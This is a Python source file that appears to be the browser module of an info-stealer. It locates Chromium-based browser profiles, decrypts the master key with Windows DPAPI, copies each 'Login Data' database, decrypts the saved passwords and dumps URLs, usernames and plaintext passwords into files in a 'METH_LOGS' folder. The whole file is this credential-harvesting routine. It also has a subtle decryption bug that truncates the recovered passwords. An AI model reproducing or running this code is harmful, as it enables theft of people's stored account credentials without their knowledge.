import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from config.paths import BROWSERS

LOG_DIR = Path("METH_LOGS")
LOG_DIR.mkdir(exist_ok=True)

def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, "..", "Local State")
    if not os.path.exists(local_state_path):
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]

    try:
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except:
        return None

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AESGCM(key)
        decrypted = cipher.decrypt(iv, payload, None)
        return decrypted[:-16].decode()
    except:
        return ""

def extract_chromium_logins(browser_name, profile_path):
    login_db = os.path.join(profile_path, "Login Data")
    if not os.path.exists(login_db):
        return []

    temp_db = LOG_DIR / f"temp_{browser_name.lower()}_logins.db"
    shutil.copy2(login_db, temp_db)

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        logins = []

        master_key = get_master_key(profile_path)
        if not master_key:
            return [{"error": "Failed to get master key"}]

        for row in cursor.fetchall():
            url, username, enc_pass = row
            if not enc_pass:
                continue
            password = decrypt_password(enc_pass, master_key)
            if password:
                logins.append(f"URL: {url}\nUsername: {username}\nPassword: {password}\n{'-'*60}")

        conn.close()
        os.remove(temp_db)
        return logins
    except Exception as e:
        if os.path.exists(temp_db):
            os.remove(temp_db)
        return [{"error": str(e)}]

def main():
    for browser, base_template in BROWSERS.items():
        base = os.path.expandvars(base_template)
        if not os.path.exists(base):
            continue

        category_file = LOG_DIR / f"browsers_{browser.lower().replace(' ', '_')}.txt"
        with open(category_file, "w", encoding="utf-8", errors="ignore") as log:
            log.write(f"=== {browser} ===\n\n")

            profiles = [base]
            if "Default" in base:
                parent = os.path.dirname(base)
                for d in os.listdir(parent):
                    if d.startswith("Profile ") or d == "Default":
                        profiles.append(os.path.join(parent, d))

            for profile in profiles:
                logins = extract_chromium_logins(browser, profile)
                if not logins:
                    continue

                profile_name = os.path.basename(profile)
                log.write(f"Profile: {profile_name}\n\n")
                for entry in logins:
                    if isinstance(entry, dict) and "error" in entry:
                        log.write(f"Error: {entry['error']}\n\n")
                    else:
                        log.write(entry + "\n")
                log.write("\n")

if __name__ == "__main__":
    main()
